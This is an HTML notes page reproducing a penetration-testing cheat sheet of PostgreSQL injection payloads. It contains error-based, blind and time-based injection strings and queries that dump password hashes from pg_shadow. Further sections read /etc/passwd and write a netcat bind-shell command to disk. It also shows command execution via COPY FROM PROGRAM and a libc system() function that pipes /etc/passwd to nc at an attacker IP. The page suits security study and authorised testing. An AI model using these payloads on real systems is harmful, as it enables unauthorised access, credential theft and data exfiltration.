<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PostgreSQL</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">PostgreSQL</h1><br/><strong><h1>PostgreSQL injection</h1></strong><br /><br /><br /><h2>Summary</h2><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-comments">PostgreSQL Comments</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-version">PostgreSQL version</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-current-user">PostgreSQL Current User</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-users">PostgreSQL List Users</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-password-hashes">PostgreSQL List Password Hashes</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-database-administrator-accounts">PostgreSQL List Database Administrator Accounts</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-privileges">PostgreSQL List Privileges</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-database-name">PostgreSQL database name</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-database">PostgreSQL List databases</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-tables">PostgreSQL List tables</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-columns">PostgreSQL List columns</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based">PostgreSQL Error Based</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-blind">PostgreSQL Blind</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-time-based">PostgreSQL Time Based</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-stacked-query">PostgreSQL Stacked query</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-file-read">PostgreSQL File Read</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-file-write">PostgreSQL File Write</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution">PostgreSQL Command execution</a>• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193">CVE-2019–9193</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-libcso6">Using libc.so.6</a><br /><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#references">References</a><br /><br /><br /><br /><h2>PostgreSQL Comments</h2><br />--<br />/**/  <br /><br /><br /><h2>PostgreSQL Version</h2><br />SELECT version()<br /><br /><br /><h2>PostgreSQL Current User</h2><br />SELECT user;<br />SELECT current_user;<br />SELECT session_user;<br />SELECT usename FROM pg_user;<br />SELECT getpgusername();<br /><br /><br /><h2>PostgreSQL List Users</h2><br />SELECT usename FROM pg_user<br /><br /><br /><h2>PostgreSQL List Password Hashes</h2><br />SELECT usename, passwd FROM pg_shadow <br /><br /><br /><h2>PostgreSQL List Database Administrator Accounts</h2><br />SELECT usename FROM pg_user WHERE usesuper IS TRUE<br /><br /><br /><h2>PostgreSQL List Privileges</h2><br />SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user<br /><br /><br /><h2>PostgreSQL Database Name</h2><br />SELECT current_database()<br /><br /><br /><h2>PostgreSQL List Database</h2><br />SELECT datname FROM pg_database<br /><br /><br /><h2>PostgreSQL List Tables</h2><br />SELECT table_name FROM information_schema.tables<br /><br /><br /><h2>PostgreSQL List Columns</h2><br />SELECT column_name FROM information_schema.columns WHERE table_name='data_table'<br /><br /><br /><h2>PostgreSQL Error Based</h2><br />,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)<br />,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--<br />,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--<br />,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)<br /><br />' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1<br />' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1<br />' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1<br />' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1<br /><br /><br /><h2>PostgreSQL Blind</h2><br />' and substr(version(),1,10) = 'PostgreSQL' and '1  -&gt; OK<br />' and substr(version(),1,10) = 'PostgreXXX' and '1  -&gt; KO<br /><br /><br /><h2>PostgreSQL Time Based</h2><br />AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))<br />AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))<br /><br /><br /><h2>PostgreSQL Stacked Query</h2><br />Use a semi-colon ";" to add another query<br />http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--<br /><br /><br /><h2>PostgreSQL File Read</h2><br />select pg_ls_dir('./');<br />select pg_read_file('PG_VERSION', 0, 200);NOTE: ``pg_read_file<code>doesn't accept the</code>/` character.<br />CREATE TABLE temp(t TEXT);<br />COPY temp FROM '/etc/passwd';<br />SELECT * FROM temp limit 1 offset 0;<br /><br /><br /><h2>PostgreSQL File Write</h2><br />CREATE TABLE pentestlab (t TEXT);<br />INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');<br />SELECT * FROM pentestlab;<br />COPY pentestlab(t) TO '/tmp/pentestlab';<br /><br /><br /><h2>PostgreSQL Command execution</h2><br /><br /><br /><br /><h3>CVE-2019–9193</h3><br />Can be used from <a href="https://github.com/rapid7/metasploit-framework/pull/11598">Metasploit</a> if you have a direct access to the database, otherwise you need to execute manually the following SQL queries.<br />DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists<br />CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output<br />COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function<br />SELECT * FROM cmd_exec;                 -- [Optional] View the results<br />DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table<img src="images/1164-1.png" alt="images/1164-1.png" /><br /><br /><br /><br /><h3>Using libc.so.6</h3><br />CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;<br />SELECT system('cat /etc/passwd | nc &lt;attacker IP&gt; &lt;attacker port&gt;');<br /><br /><br /><h2>References</h2><br />• <a href="https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9">A Penetration Tester’s Guide to PostgreSQL - David Hayter</a><br />• <a href="https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5">Authenticated Arbitrary Command Execution on PostgreSQL 9.3 &gt; Latest - Mar 20 2019 - GreenWolf</a><br />• <a href="https://hackerone.com/reports/181803">SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi) - December 8, 2016 - Sergey Bobrov (bobrov)</a><br />• <a href="https://www.dionach.com/blog/postgresql-9x-remote-command-execution">POSTGRESQL 9.X REMOTE COMMAND EXECUTION - 26 Oct 17 - Daniel</a><br /></div></body></html>